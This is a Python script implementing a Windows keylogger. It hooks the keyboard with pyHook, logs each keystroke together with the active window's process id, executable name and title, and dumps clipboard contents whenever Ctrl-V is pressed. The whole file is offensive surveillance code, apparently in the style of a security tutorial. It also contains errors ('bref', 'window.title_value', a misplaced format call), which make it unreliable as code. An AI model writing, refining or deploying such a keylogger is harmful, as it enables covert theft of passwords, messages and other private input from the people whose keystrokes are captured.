from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
	# get a handle to the foreground window
	hwnd = user32.GetForegroundWindow()

	# find the process id
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	# store the current process id
	process_id = pid.value

	# grab the executable
	executable = create_string_buffer("\x00" * 512) # 0x00 == NULL
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseName(h_process, None, byref(executable), 512)

	# read the title
	window_title = create_string_buffer("\x00" * 512)
	lenght = user32.GetWindowTextA(hwnd, bref(window_title), 512)

	# print out the header if we're in the right process
	print("\n[PID: {0} - {1} - {2}").format(process_id, executable.value, window.title_value)

	# close the handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def key_stroke(event):
	global current_window

	# check if target changed windows
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()

	# if a standart key is pressed
	if event.Ascii in range(32, 128):
		print(chr(event.Ascii))
	else:
		# if [Ctrl-V] was pressed
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			print("[PASTE] - {0}".format(pasted_value))
		else:
			print ("{0}".format(event.Key))

	# pass execution to the next registered hook
	return True

# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = key_stroke

# register and loop hook
kl.HookKeyboard()
pythoncom.PumpMessages() # get a Windows message pump
